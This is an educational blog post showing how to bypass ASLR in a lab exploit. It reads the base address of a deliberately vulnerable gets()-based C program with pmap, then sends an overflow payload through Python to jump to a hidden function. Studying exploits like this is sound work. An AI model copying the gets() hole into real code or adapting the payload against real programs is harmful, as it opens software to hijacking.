---
title: Shattering the stack (1)
published: true
---

This is a follow-up to the [previous post](https://gemesa.dev/shattering-the-stack-0) where we began exploring the world of buffer overflows. Now, we will examine how to circumvent ASLR using [pmap](https://linux.die.net/man/1/pmap) (or any similar tool that can determine randomized addresses at runtime). The source code is available [here](https://github.com/gemesa/shadow-shell).

### vulnerable code

We are using the same C code to demonstrate a simple buffer overflow vulnerability (due to the use of the unsafe `gets()` function):

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// gets() was removed from the C11 standard
char* gets(char* str);

int authenticate(void)
{
    char buff[10];
    char cmd[10];
    int auth = 0;

    puts("enter the password:");
    gets(buff);
    
    if(strcmp(buff, "12345"))
    {
        puts("wrong password");
    }
    else
    {
        puts("correct password");
        auth = 1;

    }
    
    if(auth)
    {
        puts("authenticated");
        puts("your files:");
        strcpy(cmd, "ls");
        system(cmd);
    }

    return 0;
}

int main(void)
{
    authenticate();
    return 0;
}

void secret(void)
{
    puts("secret found!");
}
```

## exploit

Let’s compile and inspect the binary:

```
$ gcc lab/bof-server.c -g -o build/bof-server -fPIE -pie
...
$ objdump -f build/bof-server

build/bof-server:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000150:
HAS_SYMS, DYNAMIC, D_PAGED
start address 0x0000000000001080
```

The [flags](https://sourceware.org/binutils/docs-2.23.1/bfd/BFD-front-end.html#BFD-front-end) include `DYNAMIC` which means the binary is meant to be used with dynamic linking. This flag is typically seen in shared libraries and PIE executables. We can also see a relatively low start address. For non-PIE executables the start address is usually a fixed higher address:

```
$ gcc lab/bof-server.c -g -o build/bof-server
...
$ objdump -f build/bof-server

build/bof-server:     file format elf64-x86-64
architecture: i386:x86-64, flags 0x00000112:
EXEC_P, HAS_SYMS, D_PAGED
start address 0x0000000000401070
```

Now we verified our binary is indeed a PIE executable meaning if ASLR is activated the addresses will be randomized when we run the executable:

```
$ ./build/bof-server
enter the password:

```
Open an other terminal:

```
$ ps a | grep bof-server                                                      
  45008 pts/0    S+     0:00 ./build/bof-server
...
$ pmap -x 45008
45008:   ./build/bof-server
Address           Kbytes     RSS   Dirty Mode  Mapping
0000561f40f3e000       4       4       0 r---- bof-server
0000561f40f3f000       4       4       0 r-x-- bof-server
0000561f40f40000       4       4       0 r---- bof-server
0000561f40f41000       4       4       4 r---- bof-server
0000561f40f42000       4       4       4 rw--- bof-server
0000561f42cf9000     132       4       4 rw---   [ anon ]
00007f20ed234000       8       4       4 rw---   [ anon ]
00007f20ed236000     152     148       0 r---- libc.so.6
00007f20ed25c000    1396     720       0 r-x-- libc.so.6
00007f20ed3b9000     308      64       0 r---- libc.so.6
00007f20ed406000      16      16      16 r---- libc.so.6
00007f20ed40a000       8       8       8 rw--- libc.so.6
00007f20ed40c000      40      28      28 rw---   [ anon ]
00007f20ed434000       4       4       0 r---- ld-linux-x86-64.so.2
00007f20ed435000     156     156       0 r-x-- ld-linux-x86-64.so.2
00007f20ed45c000      40      40       0 r---- ld-linux-x86-64.so.2
00007f20ed466000       8       8       8 r---- ld-linux-x86-64.so.2
00007f20ed468000       8       8       8 rw--- ld-linux-x86-64.so.2
00007ffcce354000     132      12      12 rw---   [ stack ]
00007ffcce37e000      16       0       0 r----   [ anon ]
00007ffcce382000       8       4       0 r-x--   [ anon ]
ffffffffff600000       4       0       0 --x--   [ anon ]
---------------- ------- ------- ------- 
total kB            2456    1244      96
```

Our goal is once again to jump to our `secret()` function:

```
$ objdump -d build/bof-server
...
0000000000001228 <secret>:
    1228:	55                   	push   %rbp
    1229:	48 89 e5             	mov    %rsp,%rbp
    122c:	48 8d 05 25 0e 00 00 	lea    0xe25(%rip),%rax        # 2058 <_IO_stdin_used+0x58>
    1233:	48 89 c7             	mov    %rax,%rdi
    1236:	e8 f5 fd ff ff       	call   1030 <puts@plt>
    123b:	90                   	nop
    123c:	5d                   	pop    %rbp
    123d:	c3                   	ret
...
```

The address `0x0000000000001228` is relative to the base address of our running process, so if it is `0x0000561f40f3e000` as we saw above then the address of `secret()` will be `0x0000561f40f3e000 + 0x0000000000001228`.

There are 2 problems:
- the base address will be only known after we run `bof-server`
- there is a high chance our address will contain non-printable characters like `\x10`, and passing these to a command-line executable can be tricky, especially if we are using a standard shell or command prompt, as these environments typically don't handle non-printable characters well in direct input

As a solution to these problems we will use the Python interpreter to run `bof-server` and pass our password (payload) to it:

```
$ python                
Python 3.11.6 (main, Oct  3 2023, 00:00:00) [GCC 13.2.1 20230728 (Red Hat 13.2.1-1)] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import subprocess
>>> cmd = ['stdbuf', '-o0', './build/bof-server']
>>> proc = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
```

Note: `stdbuf -o0` sets the stdout stream buffering mode to unbuffered. This is necessary because without this some of the stdout was lost (stdout was almost empty after calling `proc.communicate()`).

Now our process is waiting for our password input so we can check the base address:

```
$ ps a | grep bof-server
  46104 pts/0    S+     0:00 ./build/bof-server
...
$ pmap -x 46104
46104:   ./build/bof-server
Address           Kbytes     RSS   Dirty Mode  Mapping
00005651e7c8a000       4       4       0 r---- bof-server
...
```

Then calculate the address of `secret()` and pass our payload:

```
>>> hex(0x00005651e7c8a000+0x1228)
'0x5651e7c8b228'
>>> password = b'aaaaaaaaaabbbbcccccccc\x28\xb2\xc8\xe7\x51\x56'
>>> proc.stdin.write(password)
28
>>> proc.communicate()
(b'enter the password:\nwrong password\nauthenticated\nyour files:\narsenal\nbuild\nCargo.lock\nCargo.toml\nlab\nLICENSE\nMakefile\nREADME.md\ntarget\nsecret found!\n', b'')
>>> exit()
```

`proc.communicate()` returns the stdout and stderr logs. As we can see `secret()` was called because we see `secret found!` in the output.

References:
- [https://reverseengineering.stackexchange.com/questions/19598/find-base-address-and-memory-size-of-program-debugged-in-gdb](https://reverseengineering.stackexchange.com/questions/19598/find-base-address-and-memory-size-of-program-debugged-in-gdb)
